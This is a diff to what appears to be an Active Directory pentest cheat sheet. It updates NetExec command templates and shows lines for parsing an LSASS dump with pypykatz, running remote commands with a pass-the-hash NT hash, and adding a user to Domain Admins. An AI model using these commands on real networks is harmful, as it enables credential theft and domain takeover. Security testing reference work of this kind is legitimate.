@@ -498,11 +498,11 @@ pypykatz lsa minidump lsass.DMP
   ```
   #### PowerShell
   ```bash
-  NetExec <target_IP> -u <username> -p <password> -H <hash_NT]> -X <command>
+  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash_NT]> -X <command>
   ```
   #### Add a new Domain Admin
   ```bash
-  NetExec <target_IP> -u <username> -p <password> -H <hash_NT]> -x 'net group "Domain Admins" <username> /add /domain'
+  NetExec <protocol> <target_IP> -u <username> -p <password> -H <hash_NT]> -x 'net group "Domain Admins" <username> /add /domain'
   ```
 </details> 
   
